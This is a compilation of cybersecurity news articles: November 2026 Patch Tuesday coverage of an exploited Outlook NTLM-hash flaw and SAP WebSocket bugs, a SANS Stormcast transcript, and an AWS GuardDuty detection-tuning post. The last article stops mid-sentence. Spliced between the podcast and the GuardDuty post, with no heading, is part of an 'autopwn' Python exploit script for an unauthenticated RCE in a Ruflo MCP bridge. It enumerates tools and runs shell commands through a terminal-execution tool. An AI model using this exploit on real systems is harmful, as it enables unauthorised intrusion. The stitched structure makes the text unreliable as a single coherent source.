articles.title: November 2026 Patch Tuesday: 63 Critical Microsoft fixes, plus an Outlook zero day that allows theft of hashed credentials
articles.context: A currently exploited zero-day vulnerability that can let attackers steal hashed Outlook NTLM credentials is among the 1,094 holes Microsoft fixed in its November Patch Tuesday...
articles.full_text:
A currently exploited zero-day vulnerability that can let attackers steal hashed Outlook NTLM credentials is among the 1,094 holes Microsoft fixed in its November Patch Tuesday releases.

Although rated as only moderate in severity, with a CVSS score of 6.5, Windows administrators need to address CVE-2026-124194 immediately because threat actors are already attacking it. “Don’t let the low score fool you,” said Nick Carroll, cyber incident response manager at Nightwing.

Affected products include Microsoft 365 Apps for Enterprise, and Office LTSC 2021 and 2024. However, since the user has to open a malicious Office file to launch the attack, good employee cybersecurity awareness training and an effective email gateway could mitigate this attack until the patch is installed.

Opening the malicious file could cause Outlook to connect to an attacker-controlled network location without displaying the usual external-content warning, potentially disclosing authentication information that could be used to impersonate the user. The vulnerability discloses a user’s NTLMv2 password hash to the attacker, who may be able to relay it to other systems to sign in as the user, or crack it to recover the password.

Microsoft, which has been using its AI model to find thousands of vulnerabilities in its products since the summer, credited an Anthropic researcher using the Claude AI assistant for finding the Outlook vulnerability. That led Satyam Narang, senior staff researcher at Tenable, to comment, “for most of the year, AI has been building bigger haystacks across Patch Tuesday releases, and this appears to be the first time it has found a needle.”

Separately, SAP plugged a critical memory corruption vulnerability dubbed ICM2Shell, with a CVSS rating of 10. Discovered by researchers at Onapsis, the vulnerability impacts the way the SAP Kernel handles WebSocket traffic. Onapsis said that a specially crafted sequence of WebSocket messages could either crash a process or allow an attacker to run code remotely. Affected are SAP Internet Communications Manager (ICM), which is inside the kernel, and SAP Web Dispatcher, a reverse proxy many organizations place at the edge of their network.

Microsoft patches

Of the 1,094 Microsoft vulnerabilities, 63 were rated as critical.

Four flaws carry a CVSS severity score of 9.8, noted Jack Bicer, director of vulnerability research at Action1, and three of them need no credentials and no user action to exploit. The Windows LDAP Remote Code Execution Vulnerability (CVE-2026-119958) lets an unauthenticated attacker run code inside the Windows LDAP service, which puts domain controllers and the whole Active Directory environment at risk.

The Microsoft Exchange Server Remote Code Execution Vulnerability (CVE-2026-118207) can be triggered by anyone able to send email to the organization, Bicer said, and the Windows Xbox Live Networking Service Remote Code Execution Vulnerability (CVE-2026-112967) gives an attacker on the same network full control of a Windows system.

The fourth, the Azure OpenAI Elevation of Privilege Vulnerability (CVE-2026-119990), sits in a cloud service many teams now depend on. However, this service is automatically patched by Microsoft.

Patch order should follow reach, not product names, Bicer advised CSOs. Domain controllers and Exchange servers go first, he said, followed by anything that exposes IIS, Microsoft Secure Channel (Schannel) or RPC to untrusted networks.

Message Queuing deserves an inventory before it gets a patch: find every server where the service is enabled, turn it off where no application needs it, and patch the rest the same day, he said, adding that hypervisor hosts need their own maintenance window, because one escaped guest becomes a problem for every tenant on that host.

“What defenders need to know and do right now is abandon broad triage and take immediate defensive action,” said Dustin Childs, head of threat awareness at TrendAI’s Zero Day Initiative. That means first patching Exchange and domain controllers (meaning LDAP/Kerberos) to stop zero-click compromise, ring-fence exposed network services like DNS and DHCP to prevent wormable spread, and verify manual administrative fixes on cloud services your organization uses.

Tyler Reguly, associate director of security R&D at Fortra, observed that there are fewer Microsoft vulnerabilities this month than there were in October, but noted, “I’m not foolish enough to think that this single drop indicates that we’re into the downward trend that I predicted we’ll see in the coming months. Instead, I think that we’re seeing a continuation of the elevated numbers as Microsoft continues to fix long hidden issues that are being surfaced by AI. Soon, however, these numbers will begin to decline as the last of these long-hidden issues are resolved and we only have new bugs to deal with.”

CSOs can help their teams by ignoring any noise coming from vendors and any vulnerabilities that are overhyped, Reguly said. When vulnerability counts started to rise, it was C-level employees who jumped up the fastest and added to the burden their admins were facing. “Now it’s time to settle down and support your teams rather than increasing their burden. CSOs should keep in mind that AI companies and security vendors may needlessly hype unimportant vulnerabilities because it is cheap, effective marketing for their services,” he pointed out. “A vulnerability isn’t critical if you don’t have the impacted software deployed.”

Prevention is key, so CSOs should focus their efforts on system hardening and mitigation. This, he said, will be more effective than chasing vulnerabilities. Finally, Reguly reminded CSOs that prioritization matters. “If you’ve developed a prioritization strategy that works for you, don’t change your process just because the media is looking for clicks,” he said.

SAP patches

The critical vulnerabilities collectively known as ICM2Shell are CVE-2026-76964 and CVE-2026-89126. Researchers at Onapsis, who discovered them, said exploitation isn’t theoretical; they provided SAP with a working exploit that achieves full, unauthenticated remote code execution end to end, running arbitrary commands as adm on the target system. The denial-of-service condition, in turn, reproduced on every SAP Kernel release tested.

To access the flaw, an attacker only needs network access to the HTTP/HTTPS port, says Onapsis. Because WebSocket support is enabled by default in both the ICM and the SAP Web Dispatcher, a system is exposed even if no application uses WebSocket. Some services, including default ICF services in SAP S/4HANA, accept WebSocket connections without authentication, and in others the flaw can be reached before authentication takes place. “Nothing in the chain requires an SAP user, a password or a certificate,” the researchers said.

The adm account owns the SAP installation, the researchers pointed out, including its executables, its instance profiles, its secure store, and its connection to the database. Running commands as that user grants full control of the SAP system. An attacker could, among other things recover database credentials and other secrets from the secure store and profiles and use them to read or alter any business data directly in the database; collect RFC destinations and technical credentials that let them move on to the SAP and non-SAP systems connected to this one; change configuration or binaries to keep persistent access; and destroy data.

Other patches

Chris Goettl, VP of product management at Ivanti, drew attention to patches from Adobe, Mozilla and Google.

Adobe released nine security bulletins that resolve 110 CVEs, 22 of which are critical. Adobe said it is not aware of any exploits in the wild. The two Priority 2 updates carry the most risk; Connect (APSB26-191) has the largest count at 24 CVEs, 18 of them critical and six rated CVSS 10.0. The vulnerabilities span SSRF, path traversal and SQL injection, and affect Windows on-prem versions 12.12 and earlier. The Experience Manager (APSB26-189) patch fixes 14 CVEs, including four Critical code execution flaws rated CVSS 9.9.

Google Chrome 157.0.8103.50, released on Monday, resolved nine CVEs including CVE-2026-125350, which is being actively exploited in the wild. This marks Chrome’s eighth zero-day exploit of 2026, Goettl noted. Chromium-based browsers such as Microsoft Edge will need the fix as well, and users should relaunch after updating for the patch to take effect. This patched release follows Chrome 157’s November 3 release, which fixed 213 vulnerabilities, seven of them critical. Separately, Google’s November Android bulletin fixed 216 vulnerabilities, 23 of them critical, with none marked as exploited. The target is patch level is 2026-11-05 or later.

Mozilla’s November 10 release includes Firefox 160, which resolves 99 CVEs (57 of them are ranked High). Firefox ESR 153.7 resolves 81 vulnerabilities. (51 High), and ESR 115.45 resolves 28, all High. Many of the High-rated issues are use-after-free and memory boundary flaws across graphics, DOM, layout, and JavaScript components, including a number of sandbox escapes such as CVE-2026-124907, a use-after-free in CanvasWebGL that allows privilege escalation and sandbox escape. The same flaw is addressed in Thunderbird 160 and Thunderbird 153.7.

articles.title: ISC Stormcast For Wednesday, November 11th, 2026 https://isc.sans.edu/podcastdetail/10174, (Wed, Nov 11th)
articles.context: Of course I have to start with the one vulnerability that's already being exploited. Nothing too serious and Microsoft also does not rate this vulnerability critical.
articles.full_text: Hello and welcome to the Wednesday November 11th, 2026 edition of the SANS Internet Storm Center's Stormcast. My name is Johannes Ullrich, recording today from Washington DC. And this episode is brought to you by the SANS.edu, Graduate Certificate Program in Cybersecurity Leadership. And of course today Microsoft Patch Tuesday is at the top of the news and the AI induced patch surge continues with Microsoft. Microsoft is addressing 1260 different vulnerabilities this month. 68 of these vulnerabilities are considered critical. Now out of these vulnerabilities there are 167 vulnerabilities that are actually Chromium vulnerabilities. And yes they affect Microsoft Edge. That's why Microsoft is including them in their patch lists. But not really sort of a Microsoft product per se. And we haven't always included them. Depends a little bit on how Microsoft is representing them in their vulnerability feed. But still a lot of vulnerabilities sort of in line with what we had the last couple months from Microsoft. Now I picked a couple vulnerabilities here that I considered somewhat more significant. Of course I have to start with the one vulnerability that's already being exploited. That's an Outlook spoofing vulnerability. And apparently Outlook will not really tell you the risk of a particular file when you're opening it. So probably one of those Mark of the Web style vulnerabilities that is being exploited here. Nothing too serious and Microsoft also does not rate this vulnerability critical. And definitely something that you want to take care of. Now as far as the critical vulnerabilities are concerned. There are sort of three groups really that I'm paying a little bit more attention to. One is remote code execution vulnerability in Microsoft LDAP. LDAP of course they're used throughout the sort of Active Directory ecosystem. So there's certainly some at least internal exposure here. And something that you have to watch out for. Yes and please don't expose it to the internet. And then we have a number of different vulnerabilities. I listed five in the diary. These are all critical vulnerabilities that relate to Microsoft Queuing, Queue Manager. This sort of a group of issues that keeps coming up around Queue Manager. Definitely something I haven't seen a lot of exploit out there yet. But haven't really been looking that much at it either. Definitely something that tends to be exposed at least internally. Something that you must pay attention to. And then we do have sort of interestingly Windows TCP/IP remote code execution vulnerability. Has a fairly low CVSS score, 7.5. But Microsoft still rates it critical. Will be interesting to see a little bit more detail about this particular vulnerability. Given all the issues we had sort of in the Linux world. With like the Multipath TCP option issue and such. So maybe there's something related going on in Windows as well. Other than that, yes lots and lots of vulnerabilities. So too much to really talk about them all in detail. But again only one that's already being exploited. And otherwise, yes just a lot of them. Nothing really that sort of in my opinion sticks out that much. Just apply those patches before the next month's release comes out. But then we also got patches from Apple. iOS, iPadOS, macOS, watchOS and visionOS are being addressed in these patches. Only nine different vulnerabilities. We're not yet seeing sort of that AI surge from Apple as we're seeing from Microsoft. There's of course always a possibility of some silent patching happening here. But yeah, a fairly small patch set. What Apple however is doing that we are seeing more sort of of these incremental updates. So that may be hiding a little bit the total number of patches. But last time I checked really it didn't go up like by orders of magnitude. It's like what we're seeing with Microsoft. Now for iPadOS we are getting patches back to 18. Same for macOS. watchOS we only get sort of one version back. And visionOS just for the current version. Now as far as the older versions go. One of the vulnerabilities actually only affects the older version of iOS. And this is a vulnerability when an attacker may be able to pair your device with an AirPlay receiver. The attacker must have physical access to the device. But this works even if the device is locked. Interesting there are a couple of vulnerabilities that affect Bluetooth. That's sort of the majority here of the vulnerabilities. And the idea behind these vulnerabilities is that these vulnerabilities weaken the handshake procedure with Bluetooth. So essentially someone would be able to pair a device with your phone or your Mac. There's also some rate limiting issues for example here with AirPlay. That also you know could make it easier to kind of brute force connection with your device. And then we also have a vulnerability that sort of leaks sensitive data. And probably some of the more interesting vulnerability from this set is a vulnerability in iMessage. Where someone may be able to actually join an iMessage group. And then receive its messages without you actually sort of inviting them or adding them to an iMessage group. Not sure if they would still show up as a member in that group. Anyway, apply the patches. Nothing sort of outrageously dangerous here or critical. Nothing exploited at least as far as Apple states it in their advisory. Well we also have a patch day from SAP. Now SAP typically does have a patch day in sync with Microsoft. I often don't cover them because not too many people are using SAP. But if you're using SAP and SAP NetWeaver which is one of the affected products here. Well you certainly care about these vulnerabilities. And earlier this week I wrote about it. So figured I'll at least mention the patch Tuesday for SAP. There are four vulnerabilities that have a perfect 10 as their CVSS score. And then an additional three with a 9.9. And two more in the nines. And so certainly something to pay attention to. There is one vulnerability that's broken access control in SAP Gateway. Onapsis, a company that does research in ERP security, has reported this vulnerability and published a blog post about it. They're luckily not going into too much detail. So it's not sort of a blueprint for exploitation of the vulnerability. But it gives a couple of hints. Like for example the proxy's access control list. Here is apparently sort of one of the culprits in enabling this vulnerability. So that one actually sounds like it's once the details are out. Not that terribly difficult to exploit. We also have memory corruption vulnerabilities. Again Onapsis has details about at least one of these vulnerabilities. It affects WebSockets. This one is likely a little bit more difficult to exploit. Onapsis is only talking about sort of how they exploit it for denial of service. But yes, remote code execution is possible via that vulnerability. Just of course as many of these memory corruption vulnerabilities may not be that easy sort of to exploit reliably. So definitely get your SAP products updated. And as all of these complex systems of course, take also look at which components you are actually running in your environment. Well, that's it for today. Thanks for listening. Thanks for liking. Thanks for subscribing to this podcast. And talk to you again tomorrow. Bye.

The bridge returns JSON inside a text field inside JSON # Outer: resp["result"]["content"][0]["text"] -> JSON string # Inner: that JSON string has another "content" array outer_text = resp["result"]["content"][0]["text"] middle = json.loads(outer_text) # middle is {"content": [{"type": "text", "text": "{...}"}]} inner_text = middle["content"][0]["text"] inner = json.loads(inner_text) return inner.get("output", "").strip() except Exception: # Fallback: return whatever we got as string return str(resp) def get_local_ip(): """Get the local IP that can reach the target.""" s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) try: s.connect(("8.8.8.8", 80)) return s.getsockname()[0] finally: s.close() # --------------------------------------------------------------------------- # Banner # --------------------------------------------------------------------------- def banner(): print(f"{BLUE}") print(" ==================================================") print(" autopwn - CVE-2026-59726 (RufRoot)") print(" Unauthenticated RCE in the Ruflo MCP Bridge") print(" ==================================================") print(f"{NC}") print() # --------------------------------------------------------------------------- # Steps # --------------------------------------------------------------------------- def step1_check_bridge(target): info("Step 1/3 - Checking MCP bridge reachability...") try: resp = urllib.request.urlopen( f"http://{target}:{MCP_PORT}/health", timeout=TIMEOUT ) data = json.loads(resp.read().decode()) assert data.get("service") == "mcp-bridge" log(f"Bridge is up: {data['service']} v{data['version']} " f"({data['tools']['total']} tools)") except Exception as e: fail(f"Bridge not reachable: {e}") def step2_verify_unauth(target): info("Step 2/3 - Verifying unauthenticated tools/list...") resp = mcp_call(target, "/mcp/devtools", "tools/list") tools = [t["name"] for t in resp.get("result", {}).get("tools", [])] if "ruflo__terminal_execute" not in tools: fail("ruflo__terminal_execute not found in tools/list") log(f"tools/list returned {len(tools)} tools without authentication") log("ruflo__terminal_execute is present (CWE-306 confirmed)") def step3_rce(target): info("Step 3/3 - Confirming RCE via ruflo__terminal_execute...") output = rce(target, "id && hostname") if "uid=" not in output: fail(f"RCE did not return expected output: {output}") log(f"RCE confirmed: {output.split(chr(10))[0]}") # --------------------------------------------------------------------------- # Main # --------------------------------------------------------------------------- def main(): banner() if len(sys.argv) != 2: print(f"Usage: python3 autopwn.py <target_ip>") sys.exit(1) target = sys.argv[1] info(f"Target : {target}:{MCP_PORT}") info(f"CVE : CVE-2026-59726 (Ruflo MCP Bridge, pre-3.16.3)") print() step1_check_bridge(target) step2_verify_unauth(target) step3_rce(target) if __name__ == "__main__": main()

articles.title: Reduce alert fatigue by customizing threat detection features in Amazon GuardDuty
articles.context: Over the past year, AWS has released a set of capabilities within GuardDuty that you can use to supply that missing context, most recently with the launch of Custom Detection Rules
articles.full_text:
The teams responsible for security today don’t have a problem with the number of alerts they receive; they have a problem turning those alerts into something truly actionable. When an analyst concludes an investigation with “this was caused by our vulnerability scanner” or “this account is configured to share Amazon Machine Images (AMIs) publicly on purpose,” the detection worked as designed, it just wasn’t applicable to the environment. When this happens continuously at scale, alert fatigue sets in. As teams sort through these events, incident response slows down or, worse, teams stop paying attention to the alerts at all.

Amazon GuardDuty is a threat detection service that continuously monitors, analyzes, and processes Amazon Web Services (AWS) data sources and logs in your AWS environment for suspicious or potentially malicious activity. GuardDuty then delivers detailed security findings to you for visibility and remediation. GuardDuty accomplishes this by analyzing independent streams of available sources. This includes logging of management events in AWS CloudTrail, information about IP traffic through Amazon Virtual Private Cloud (Amazon VPC) Flow Logs, and Amazon Route 53 DNS query logs to name a few. These sources don’t need to be enabled or configured within your accounts for GuardDuty to use them. When GuardDuty observes activity that looks suspicious or anomalous, it produces a finding that’s a detailed security alert naming the behavior, the resources involved, and any supporting evidence. A finding is a signal to investigate, not a final verdict.

While the managed detections in GuardDuty work consistently across every AWS customer, personalizing detections for your specific architectures and environments is equally important. Over the past year, AWS has released a set of capabilities within GuardDuty that you can use to supply that missing context, most recently with the launch of Custom Detection Rules.

In this post, we walk through those capabilities in three distinct stages. These stages explore how to customize what GuardDuty detects, triage the findings that remain, and accelerate investigations. Throughout this blog post you’ll learn how to:

Efficiently detect anomalous behavior that shouldn’t occur in a specific account, without building detection logic yourself

Measure if a detection will be noisy before it generates a single finding, flooding security teams

Feed your own custom threat intelligence, including file hashes, into GuardDuty

Scope a suppression rule narrowly enough to archive expected activity while surfacing the same behavior elsewhere

Get an automated analysis of a finding, with a risk level and recommended actions, before the finding is opened manually

Prerequisites

For the walkthrough in this post, you must have the following prerequisites in place.

GuardDuty must be enabled in at least one AWS account and AWS Region. Note that these customization features aren’t currently available in all Regions, for more information, see Region-specific feature availability.

Your user or role must have AWS Identity and Access Management (IAM) permissions to configure these features in GuardDuty. The AmazonGuardDutyFullAccess_v2 managed policy covers the required actions.

If you manage multiple accounts through AWS Organizations, AWS recommends administering GuardDuty using the delegated administrator account. By using this method, you can manage lists, suppression rules, and conduct investigations from a centralized location.

GuardDuty Runtime Monitoring must be enabled to conduct file hash matching and to use Custom Detection Rules for Runtime Monitoring. This protection plan isn’t enabled automatically in GuardDuty.

An Amazon Simple Storage Service (Amazon S3) bucket that you control for storage of custom threat entity lists.

The AWS Command Line Interface (AWS CLI) installed.

Stage 1: How to customize what GuardDuty detects

An AMI is a pre-configured template that contains the software configurations needed to launch an Amazon Elastic Compute Cloud (Amazon EC2) instance on AWS. Sharing an AMI publicly can be a routine operation in an account whose purpose is distributing images, and a potential security event in any other account. The same might be said for disabling VPC Flow Logs, or signing in without multi-factor authentication for a legacy service account. Until the release of Custom Detection Rules, there was no way to account for these differences in GuardDuty.

Custom Detection Rules

Custom Detection Rules is a library of prebuilt, opt-in rules that AWS builds and maintains. At launch, it holds 90 rules across AWS CloudTrail management events and GuardDuty Runtime Monitoring events, producing 38 finding types mapped to 13 MITRE ATT&CK® tactics, described using vocabulary from ATT&CK and the Threat Technique Catalog for AWS. The catalog is maintained by the AWS Customer Incident Response Team (CIRT) and is based on the MITRE ATT&CK Cloud Matrix, documenting threat actor tactics, techniques, and procedures specific to AWS as observed by the AWS CIRT during customer engagements. Each entry includes detection guidance and mitigations specific to AWS environments, so a technique ID on a finding points to a public entry that your team can read.

Previously, detecting environment-specific behavior meant ingesting your own CloudTrail logs or host telemetry, normalizing them, building the logic, and maintaining that logic as APIs changed. Custom Detection Rules remove that work. You select the rules for GuardDuty to evaluate against the CloudTrail management events it already analyzes and, where Runtime Monitoring is enabled, the runtime events from the GuardDuty security agent, without the undifferentiated heavy lifting of log ingestion, normalization, and storage. Coverage is extended without adding unnecessary alerts that don’t add value to your teams.

Each rule runs in one of two modes. In dry run mode, GuardDuty evaluates the rule and publishes Amazon CloudWatch metrics showing how often an event matched the rule, but generates no findings. Dry run mode expires automatically after 14 days. In live mode, events that match generate findings, and live mode has no expiration.

Custom Detection Rules are currently available in all AWS commercial Regions and the AWS GovCloud (US) Regions. Custom Detection Rules for Runtime Monitoring are available in every region where GuardDuty Runtime Monitoring is available.

Walkthrough: Measure a rule, then turn it on

Start in dry run so you can measure the noise level before receiving a finding. This walkthrough uses the AMIExternalAccess rule, which detects when an AMI is shared with an external AWS account or made public, and applies it from the GuardDuty delegated administrator account. In an organization, the delegated administrator manages Custom Detection Rules for all member accounts through an organization configuration, and accounts that join the organization later inherit it.

Using the GuardDuty console

Open the AWS Management Console for GuardDuty and choose Custom Detection Rules.

Figure 1. The Custom Detection Rules catalog with the detection logic for the AMIExternalAccess rule

Select a rule name to see its detection logic on the Details tab. Rules are SQL conditions over CloudTrail fields, so you can review exactly what a rule matches before enabling it.

Choose the rule’s Accounts tab, then under Organization configuration, choose Configure.

Figure 2. Configuring the AMIExternalAccess rule in dry run mode

Under Configuration strategy, select Whole organization. Under Status, select Dry run. Under Accounts, select Apply rule status to all accounts, then choose Save.

Watch the CustomRuleDryRunSignalsMatched metric in CloudWatch. GuardDuty publishes the metric only when the rule matches an event, so a rule with no matching activity shows no data. Because dry run mode expires automatically after 14 days, a full dry-run period is the longest continuous sample GuardDuty collects without you re-enabling the rule. The metric data persists in CloudWatch under its standard retention after the dry run ends, so you can review it shortly before or after expiry and still base your decision on the most complete data available. Volume alone doesn’t tell you whether the activity is benign, so account for what you see before deciding. If a rule matches constantly and someone can point to the process that causes it, that account is a poor candidate for live mode. If nobody can explain the matches, investigate them as they stand, because a dry run measuring real attacker activity looks the same as one measuring routine operations.

Figure 3. Dry-run match volume for a rule over one week, shown as hourly totals

When you’re satisfied the rule is worth acting on, return to the rule’s organization configuration and change Status to Live to start generating findings. To keep the rule off in accounts where the activity is expected, such as an image-build account, choose Exclude accounts manually under Accounts and select those accounts.

Using the AWS CLI

From the delegated administrator account, apply the rule in dry run to the whole organization. Omitting account lists targets every member account, including accounts that join later.

aws guardduty create-custom-detection-rule-org-configuration \ --rule-id ami-external-access \ --mode DRY_RUN

Review the CustomRuleDryRunSignalsMatched metric over the dry-run period, applying the same judgment described in the preceding console procedure.

Move the rule to live mode by updating the existing configuration. Creating a second whole-organization configuration for the same rule fails with a conflict error. To exclude accounts where the activity is expected, add --exclude-account-ids.

aws guardduty update-custom-detection-rule-org-configuration \ --rule-id ami-external-access \ --mode LIVE \ --exclude-account-ids <image-build-account-id>

Note: In a standalone account that isn’t part of an organization, you enable a rule for that account alone. With the AWS CLI, use create-custom-detection-rule-association with the same --rule-id and --mode parameters. To change the mode later, use update-custom-detection-rule-association with the association ID. Member accounts in an organization can’t enable or change a rule themselves; the delegated administrator manages rules on their behalf. For details, see Managing Custom Detection Rules in multiple-account environments.

Threat entity lists

If your threat intelligence team already tracks known-bad infrastructure and files, you can pass those indicators to GuardDuty and generate findings when they appear in your AWS account.

GuardDuty has two list formats. An IP address list holds IP addresses only. An entity list, the newer format, can hold IP addresses, CIDR ranges, and domain names together in a single file. The difference that matters is coverage: entity list entries apply to CloudTrail, VPC Flow Logs, and Amazon Route 53 Resolver DNS query log findings, while IP address lists cover CloudTrail and VPC Flow Log findings only. If you still use IP address lists, the additional DNS coverage is a reason to move.

In addition, entity lists now also accept SHA-256 file hashes. Hashes sit alongside network indicators in the same file, and GuardDuty checks them against Runtime Monitoring. When the runtime agent sees an executable whose hash matches an active list, it generates a high severity Execution:Runtime/MaliciousFileExecuted.Custom finding and names the matching list, so your responder knows which intelligence source was used.

Note: If the entity list is changed, the list must be reactivated to include the updates. Uploading a new version of the file isn’t sufficient on its own. If this step is automated, build that reactivation step into the same process that refreshes the file.

Entity lists are currently available in all AWS commercial Regions, but not in the AWS GovCloud (US) Regions.

Stage 2: How to triage the findings that remain

Customizing detection reduces findings at the source, but the work is rarely finished there. New workloads appear, teams change how they operate, and some findings still describe activity that’s expected in your environment. You also need a precise way to route those events away from the queue your analysts work from.

A filter selects findings. A suppression rule is a filter that automatically archives a GuardDuty finding it matches. Archiving isn’t deletion: the finding is retained for 90 days and stays viewable, but the finding isn’t forwarded to AWS Security Hub, Amazon S3, Amazon Detective, or Amazon EventBridge, so it stays out of your security information and event management (SIEM) system and ticket queue.

Two changes have made that routing more customizable.

Wildcards

Filter criteria now support the Matches and NotMatches operators, where * matches any number of characters and ? matches one. Criteria used to be exact-match only, so suppressing findings from every AWS Lambda function in a service meant listing each name and updating it on every deployment. One pattern now covers the naming convention, including functions that don’t exist yet, so the rule stops going stale.

Additional property filter fields

You can now use over 1,000 supported fields from a finding as suppression criteria, including runtime process details, Kubernetes workload metadata, network connection information, and attack sequence signals. Take a vulnerability scanner in one Kubernetes namespace generating expected findings. With no namespace criterion available, you previously either suppressed the finding type more broadly than you wanted or wrote downstream logic to strip them. Now you scope the rule to that specific namespace and leave detection intact everywhere else in the cluster. This expanded field set is available in the aws partition; other partitions continue to use the console-supported fields only. See Filtering findings in GuardDuty for the full list of supported fields.

The recommended method is to assemble your criteria on the Findings page first, confirm the filtered list contains only findings you’re willing to archive, then choose Create suppression rule. The console and CLI procedures are detailed in the user guide.

Figure 4. Findings filtered by finding type and Kubernetes namespace, before creating a suppression rule

Before you write wildcard criteria, know that they can’t be validated with ListFindings or GetFindingsStatistics, the testing workflow AWS recommends for ordinary filters. Instead, start from a filter that takes no action and watch the suppression rule metrics to see how much it would match before you rely on it. Nothing is lost if the pattern is too broad, matched findings are archived rather than deleted, so you can lift the suppression rule and return them to your queue.

Stage 3: How to accelerate investigations

What remains consumes analyst hours. To decide whether a finding is a real event, an analyst pivots into CloudTrail for the operations that identity performed, lines up timestamps, checks IPs and domains against intelligence, and looks for a change ticket that explains the work. That can take hours, and most such investigations end in expected. When one doesn’t, all that time was spent before any actual containment could begin.

GuardDuty Investigation, also called AI-powered investigations performs that correlation automatically. GuardDuty Investigation analyzes the finding alongside related activity from the past 90 days, affected resources, threat intelligence, and threat indicators, and returns a structured summary in minutes: a risk level, a confidence rating, a written summary, supporting detail, MITRE ATT&CK classification, and recommended actions including the CLI commands to carry them out.

Note: Read the confidence rating as carefully as the risk level. High risk with low confidence is a very different indicator to an analyst than high risk with high confidence.

You can investigate a single finding, an account, or a whole organization, from the console, the AWS CLI, the API, or an AWS MCP Server. To turn on AI-powered investigations, go to Settings, find AI powered investigations – Preview, and choose Enable.

Figure 5. A completed account investigation with risk level, confidence, analysis summary, and recommended actions

The preview runs in 10 AWS Regions: US East (N. Virginia), US East (Ohio), US West (Oregon), Canada (Central), Europe (Frankfurt), Europe (Ireland), Europe (London), Europe (Paris), Europe (Stockholm), and Asia Pacific (Tokyo). It allows 10 investigations per account per day and 100 per account in total, and can only be started from an administrator account, member accounts can’t create investigations from their own accounts. The feature uses Amazon Bedrock models with Cross-Region Inference (CRIS), which automatically selects a Region within your geography to process the analysis and generate the report. Your data remains stored only in the Region where the investigation request originates, but investigation data and summary results might be processed outside that Region. Review that routing if you have data residency commitments. For GuardDuty Region-specific differences more broadly, see Region-specific feature availability in the user guide.

Putting it all together

Consider a team running containerized workloads on Amazon Elastic Kubernetes Service (Amazon EKS) across a handful of accounts in one organization.

The threat intelligence team uploads SHA-256 hashes from a recent brief as a threat entity list. Security engineering enables Custom Detection Rules in dry run mode and finds after 2 weeks that AMI sharing fires constantly in the image-build account and nowhere else, so they promote the rule to live across the organization and exclude the build account.

The team’s vulnerability scanner runs in a dedicated Kubernetes namespace, so they suppress that namespace and finding type while leaving the same behavior detected elsewhere. A second rule uses a wildcard on their Lambda naming convention, replacing a hand-maintained list.

Suppressed findings are archived instead of being sent to Security Hub, Amazon S3, EventBridge, or the SIEM, so they never reach the analyst queue. When a finding does warrant attention, an analyst starts an investigation and gets a disposition before manual work begins.

Each stage reduces the work of the next. Customizing detection means less to triage, effective triage means less to investigate, and automated investigation means the findings that reach a human get a decision faster.

Next steps

If you haven’t enabled GuardDuty, start with the 30-day free trial. Most protection plans enable automatically and are included, so you can evaluate them. Turn on Runtime Monitoring separately if you want to test hash matching or Custom Detection Rules for Runtime Monitoring..

If you’re already using GuardDuty:

Enable two or three Custom Detection Rules in dry run mode. Choose behavior that shouldn’t occur in specific accounts, measure across the dry-run period, then promote selectively.

Revisit existing suppression rules. Any rule written before the April 2026 field expansion might be broader than you intended, because the field you wanted wasn’t available then; narrow it to that field now.

Audit filters for wildcard opportunities. Any filter with a growing list of exact-match names is maintenance a single pattern can replace.

Migrate IP address lists to entity lists for the DNS query log coverage.

Conclusion

GuardDuty’s managed detections keep expanding, driven by AWS threat intelligence, security research, and customer feedback. These capabilities enable you to decide which activity is worth alerting on in which accounts, and which findings never need to be delivered to a human at all.

articles.title: November Patch Tuesday boasts over 1,000 bugs but only one zero-day so far
articles.context: It’s another doozy of a Patch Tuesday, with Microsoft fixing 1,094 bugs in its products, including one that attackers exploited before Redmond released a patch
articles.full_text: It’s another doozy of a Patch Tuesday, with Microsoft fixing 1,094 bugs in its products, including one that attackers exploited before Redmond released a patch. Jake Knott, head of threat intelligence at exposure management firm watchTowr, succinctly said in an email to The Register: “Maybe we should just go home.” “Most security teams haven’t quite recovered from the last month of bumper-to-bumper critical vulnerabilities, emergency patches, and ‘2shell’-branded everything, and we’re yet again at another Patch Tuesday,” Knott told us. Starting with the zero-day: It’s an Outlook spoofing vulnerability, tracked as CVE-2026-124194, and it only garnered a 6.5 out of 10 CVSS rating. But as Dustin Childs, head of threat awareness at TrendAI’s Zero Day Initiative, warns, don’t let the score or the name lull you into thinking it’s OK to put off patching this one. “It’s labeled spoofing, but the impact is bigger than the name suggests,” Childs said in his monthly Patch Tuesday review. “An attacker sends a specially crafted message file and convinces a user to open it,” he wrote. “Outlook then connects to an attacker-controlled network location without showing the usual external-content warning, which discloses the user’s NTLMv2 hash. The attacker can use that hash to authenticate as the user.” Microsoft marked CVE-2026-124194 as exploited, but per usual didn’t say when the attacks started, who is battering this bug, and what they are doing with the access post exploitation. These details will likely start trickling out soon. Plus, now that there’s a public fix, other miscreants are undoubtedly already scanning for vulnerable versions and reverse engineering the patch for their own attack purposes. So prioritize this fix, and keep an eye on your inbox for any suspicious files. Back-to-back months of 1K+ CVEs Despite the second month of more than 1,000 CVEs (October had 1,474), CVE-2026-124194 is the only one under active exploitation, and none of the 1,094 are listed as publicly known. Childs says this shouldn’t give organizations “false comfort.” “Logging back-to-back months above 1,000 CVEs proves automated bug-hunting has permanently reset patch volume,” he told The Register. “With AI making patch-diffing and exploit generation near-instant, the threat window opens the minute these updates drop.” For defenders, this means two things, Childs added. “What defenders need to know and do right now is abandon broad triage and take immediate defensive action: patch Exchange and Domain Controllers (LDAP/Kerberos) first to stop zero-click compromise, ring-fence exposed network services like DNS and DHCP to prevent wormable spread, and verify manual administrative fixes on your cloud services,” he said. Zero-click threats There are two zero-click threats in this month’s batch of fixes: CVE-2026-116928 and CVE-2026-119958. Both are critical, carrying 9.8 CVSS ratings, in part because they don’t require any user interaction to exploit. CVE-2026-116928 is an out-of-bounds write in Microsoft Windows Search Component that could lead to remote code execution. An unauthenticated attacker could abuse this search feature in Exchange “by sending an email containing a specially crafted attachment,” Redmond warned. “Exchange automatically processes the attachment for indexing, so the recipient does not need to open the email or attachment. Successful exploitation could allow the attacker to execute code with the permissions of the affected processing service.” CVE-2026-119958 is an out-of-bounds write vulnerability in Windows' implementation of the Lightweight Directory Access Protocol (LDAP) that could allow unauthenticated attackers to execute code remotely without user interaction. This one can be exploited by sending specially crafted LDAP requests to vulnerable systems, potentially compromising domain controllers. Childs also counts 30 CVEs that pose a “wormable risk,” requiring zero authentication and zero user interaction over a network. All of those are listed in his blog, so prioritize fixing those as well. And…Xbox remote code execution And finally, for funsies, a critical flaw in the Windows Xbox Live Networking 